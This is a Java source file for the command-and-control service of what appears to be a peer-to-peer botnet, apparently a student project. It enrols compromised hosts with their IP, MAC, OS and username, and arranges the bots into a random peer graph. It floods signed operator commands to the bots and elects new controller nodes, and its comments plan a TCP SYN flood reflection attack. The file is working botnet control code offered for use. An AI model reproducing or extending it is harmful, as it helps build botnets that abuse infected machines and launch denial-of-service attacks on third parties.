package cs.sii.control.command;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.OutputStream;
import java.io.UnsupportedEncodingException;
import java.security.InvalidAlgorithmParameterException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;
import java.security.PublicKey;
import java.security.SecureRandom;
import java.security.SignatureException;
import java.security.spec.InvalidKeySpecException;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;
import java.util.Set;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import org.jgrapht.UndirectedGraph;
import org.jgrapht.graph.DefaultEdge;
import org.jgrapht.graph.ListenableUndirectedGraph;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.scheduling.annotation.Async;
import org.springframework.stereotype.Service;

import cs.sii.bot.action.Auth;
import cs.sii.domain.IP;
import cs.sii.domain.Pairs;
import cs.sii.domain.SyncIpList;
import cs.sii.model.bot.Bot;
import cs.sii.model.user.User;
import cs.sii.network.request.BotRequest;
import cs.sii.network.request.CecRequest;
import cs.sii.service.connection.NetworkService;
import cs.sii.service.crypto.CryptoPKI;
import cs.sii.service.crypto.CryptoUtils;
import cs.sii.service.dao.BotServiceImpl;
import cs.sii.service.dao.RoleServiceImpl;
import cs.sii.service.dao.UserServiceImpl;

@Service("Commando")
public class Commando {

	@Autowired
	private Auth auth;

	@Autowired
	private CecRequest ccReq;

	@Autowired
	private BotRequest bReq;
	
	@Autowired
	private BotServiceImpl bServ;
	
	@Autowired
	private RoleServiceImpl rServ;
	
	@Autowired
	private UserServiceImpl uServ;

	@Autowired
	private NetworkService nServ;

	@Autowired
	private UserServiceImpl userService;

	private UndirectedGraph<IP, DefaultEdge> graph;

	@Autowired
	private CryptoPKI pki;

	@Autowired
	private CryptoUtils crypto;

	private String newKing;
	
	/**
	 * 
	 */
	public Commando() {
		super();
	}

	/**
	 * 
	 */
	public void initializeCeC() {
		nServ.updateDnsInformation();
		graph = createNetworkP2P();
		//TODO impostare vicinato cc
		System.out.println("blab " + graph);
		newKing = nServ.getMyIp().toString();

		Bot bot = new Bot(nServ.getIdHash(), nServ.getMyIp().toString(), nServ.getMac(), nServ.getOs(),
				nServ.getVersionOS(), nServ.getArchOS(), nServ.getUsernameOS(), pki.getPubRSAKeyToString(),
				(nServ.isElegible() + ""));
		bServ.save(bot);
	}

	/**
	 * @param nodes
	 * @return
	 */
	private Integer calculateK(Integer nodes) {
		Integer k= (int) Math.ceil(Math.log10(nodes + 1));
		if (nodes>3){
			k++;
		}
		return k;
	}

	/**
	 * @return
	 */
	@SuppressWarnings("unchecked")
	public UndirectedGraph<IP, DefaultEdge> createNetworkP2P() {
		// creo grafo partenza
		graph = new ListenableUndirectedGraph<IP, DefaultEdge>(DefaultEdge.class);
		List<Bot> bots = bServ.findAll();

		ArrayList<IP> nodes = new ArrayList<IP>();
		bots.forEach(bot -> nodes.add(new IP(bot.getIp())));

		MyGnmRandomGraphDispenser<IP, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0,
				new SecureRandom(), true, false);
		MyVertexFactory<IP> nodeIp = new MyVertexFactory<IP>((List<IP>) nodes.clone(), new SecureRandom());
		g2.generateConnectedGraph(graph, nodeIp, null, calculateK(nodes.size()));
		for (IP ip2 : nodes) {
			System.out.println("gli archi di  " + graph.degreeOf(ip2));
		}
		System.out.println("graph" + graph);
		System.out.println("gdegree " + calculateK(nodes.size()));
		return graph;
	}

	/**
	 * @return
	 */
	@SuppressWarnings("unchecked")
	public UndirectedGraph<IP, DefaultEdge> updateNetworkP2P() {

		List<Bot> bots = bServ.findAll();
		ArrayList<IP> nodes = new ArrayList<IP>();

		bots.forEach(bot -> nodes.add(new IP(bot.getIp())));

		MyGnmRandomGraphDispenser<IP, DefaultEdge> g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0,
				new SecureRandom(), true, false);
		ListenableUndirectedGraph<IP, DefaultEdge> graph2 = new ListenableUndirectedGraph<IP, DefaultEdge>(
				DefaultEdge.class);
		MyVertexFactory<IP> nodeIp2 = new MyVertexFactory<IP>((List<IP>) nodes.clone(), new SecureRandom());
		g2 = new MyGnmRandomGraphDispenser<IP, DefaultEdge>(nodes.size(), 0, new SecureRandom(), true, false);
		g2.updateConnectedGraph(graph, graph2, nodeIp2, null, calculateK(nodes.size()));
		for (IP ip2 : nodes) {
			System.out.println("gli archi di  " + graph2.degreeOf(ip2));
		}
		System.out.println("graph" + graph2);
		System.out.println("gdegree " + calculateK(nodes.size()));
		this.graph = graph2;
		return graph;
	}

	/**
	 * @param idBot
	 * @return
	 */
	public Pairs<Long, Integer> authReq(String idBot) {
		Pairs<Long, Integer> response;
		Long keyNumber = new Long(auth.generateNumberText());
		Integer iterationNumber = new Integer(auth.generateIterationNumber());
		auth.addBotChallengeInfo(idBot, keyNumber, iterationNumber);
		response = new Pairs<Long, Integer>(keyNumber, iterationNumber);
		return response;
	}

	/**
	 * @param objects
	 * @return
	 */
	public String checkHmac(ArrayList<Object> objects) {
		String response = "";
		String idBot = objects.get(0).toString();
		String hashMac = objects.get(7).toString();
		Long keyNumber = auth.getBotSeed().get(idBot).getValue1();
		Integer iterationNumber = auth.getBotSeed().get(idBot).getValue2();
		if (auth.findBotChallengeInfo(idBot)) {
			if (auth.validateHmac(keyNumber, iterationNumber, hashMac)) {
				response = "Challenge OK";
				objects.forEach(obj -> System.out.println("obj: " + obj.toString()));
				Bot bot;
				bot = new Bot(objects.get(0).toString(), objects.get(1).toString(), objects.get(2).toString(),
						objects.get(3).toString(), objects.get(4).toString(), objects.get(5).toString(),
						objects.get(6).toString(), objects.get(8).toString(),
						objects.get(9).toString());
				bServ.save(bot);
			}
		}
		return response;
	}

	/**
	 * @param data
	 * @return
	 * @throws BadPaddingException
	 * @throws IllegalBlockSizeException
	 * @throws InvalidAlgorithmParameterException
	 * @throws UnsupportedEncodingException
	 * @throws NoSuchPaddingException
	 * @throws NoSuchAlgorithmException
	 * @throws InvalidKeyException
	 */
	public byte[] getNeighbours(String data)
			throws InvalidKeyException, NoSuchAlgorithmException, NoSuchPaddingException, UnsupportedEncodingException,
			InvalidAlgorithmParameterException, IllegalBlockSizeException, BadPaddingException {
		String idBot;
		Bot bot = null;
		try {
			idBot = pki.getCrypto().decryptAES(data);
		} catch (InvalidKeyException | InvalidAlgorithmParameterException | IllegalBlockSizeException
				| BadPaddingException | NoSuchAlgorithmException | NoSuchPaddingException
				| UnsupportedEncodingException e) {
			System.out.println("failed to decrypt data");
			return null;
		}
		System.out.println("id bot " + idBot);
		bot = bServ.searchBotId(idBot);

		if (bot == null) {
			return null;// non autenticato
		} else {
			System.out.println(" bot " + bot.getIp());
			if (graph.containsVertex(new IP(bot.getIp()))) {
				Set<DefaultEdge> neighbours = graph.edgesOf(new IP(bot.getIp()));
				if (neighbours.size() < calculateK(bServ.findAll().size())) {
					updateNetworkP2P();
				}
			} else {
				updateNetworkP2P();
			}
		}

		Set<DefaultEdge> setEd = graph.edgesOf(new IP(bot.getIp()));
		DefaultEdge[] a = new DefaultEdge[setEd.size()];
		setEd.toArray(a);

		ArrayList<Object> ipN = new ArrayList<Object>();
		for (int i = 0; i < a.length; i++) {

			IP s = graph.getEdgeSource(a[i]);
			IP t = graph.getEdgeTarget(a[i]);
			if (!s.equals(new IP(bot.getIp()))) {
				Bot sB = bServ.searchBotIP(s);
				ipN.add(new Pairs<String, String>(sB.getIp(),(sB.getPubKey())));
			}
			if (!t.equals(new IP(bot.getIp()))) {
				Bot tB = bServ.searchBotIP(t);
				ipN.add(new Pairs<String, String>(tB.getIp(), tB.getPubKey()));
			}

		}	ByteArrayOutputStream ostream = new ByteArrayOutputStream();
		try {
			pki.getCrypto().encrypt(ipN, ostream);
			ByteArrayInputStream kk = new ByteArrayInputStream(ostream.toByteArray());
			
			if(ipN.equals(pki.getCrypto().decrypt(kk)))System.out.println("ggg0");
			
		} catch (IOException e) {
				System.out.println("fail encrypt neighbours");
		}

		return ostream.toByteArray();
	}

	// TODO inserire metodi che inviano i comandi alla rete a comando dal sito

	// attaca tcp syn flood reflection
	//
	// invia comandi ricevuti da pannello al vicinato

	// Differenziare comandi per il singolo ai comandi per la rete(es sleep per
	// un
	// bot, attacco per la rete)

	@Async
	public void flooding(String cmd, String userSSoID) {

		User user = userService.getUserRepository().findBySsoId(userSSoID);
		if (user != null) {

			String msg = "";
			// aggiungi nonce time.millis
			Long milli = System.currentTimeMillis();

			Random rand = new SecureRandom(milli.toString().getBytes());
			Integer nounce = rand.nextInt();

			String hashIdMsg = crypto.generateSha256(nounce.toString());

			String signature;
			try {
				signature = pki.signMessageRSA(hashIdMsg);
				msg = hashIdMsg + "|" + cmd + "|" + signature;
			} catch (InvalidKeyException | SignatureException e) {
				e.printStackTrace();
				System.out.println("Non sono riuscito a firmare il messaggio pre Flood");
			}

			startFlood(msg);
		}
		return;
	}

	public void startFlood(String msg) {
		nServ.getNeighbours().getList().forEach((pairs) -> {
			ccReq.sendFloodToBot(pairs.getValue1().toString(), msg);
		});
	}

	@Async //forse inutile perche siamo sul thread nostro
	public void startElection() {
		List<Bot> botList = bServ.findAll();
	
		List<String> ccList = new ArrayList<>();
		if (botList!=null){
			for (Bot bot : botList) {
				if(bot.isElegible().equals("true"))
					ccList.add(bot.getIp());
			}
			System.out.println(ccList.remove(nServ.getMyIp().toString()));
			String ip = ccList.get((int) Math.ceil(Math.random()*(ccList.size()-1)));
			System.out.println("ho eletto "+ip);
			if(ccReq.becameCc(ip)){
				newKing = ip;
			}
			System.out.println("erection completed ");
		//elegilo passa i dati
		// passa il potere	
		}
	}

	public String getNewKing() {
		return newKing;
	}

	public void setNewKing(String newKing) {
		this.newKing = newKing;
	}

	public RoleServiceImpl getrServ() {
		return rServ;
	}

	public void setrServ(RoleServiceImpl rServ) {
		this.rServ = rServ;
	}

	public UserServiceImpl getuServ() {
		return uServ;
	}

	public void setuServ(UserServiceImpl uServ) {
		this.uServ = uServ;
	}

	public BotServiceImpl getbServ() {
		return bServ;
	}

	public void setbServ(BotServiceImpl bServ) {
		this.bServ = bServ;
	}

	public NetworkService getnServ() {
		return nServ;
	}

	public void setnServ(NetworkService nServ) {
		this.nServ = nServ;
	}

	public UndirectedGraph<IP, DefaultEdge> getGraph() {
		return graph;
	}

	public void setGraph(UndirectedGraph<IP, DefaultEdge> graph) {
		this.graph = graph;
	}

	public BotRequest getbReq() {
		return bReq;
	}

	public void setbReq(BotRequest bReq) {
		this.bReq = bReq;
	}

}

// for (int i = 1; i < 20; i++) {
// nodes.add(new IP("192.168.0." + i));
// }
//
// // for(IP ip : nodes)
// for (IP ip2 : nodes) {
// System.out.println("gli archi di " + graph.degreeOf(ip2));
// }
//
// System.out.println("graph" + graph);
//
// System.out.println("gdegree " + calculateK(nodes.size()));

// System.out.println(" ||||||||||||||||||||||||||||||| ");
//
// nodes.clear();
// for (int i = 13; i < 10025; i++) {
// nodes.add(new IP("192.168.0." + i));
// }
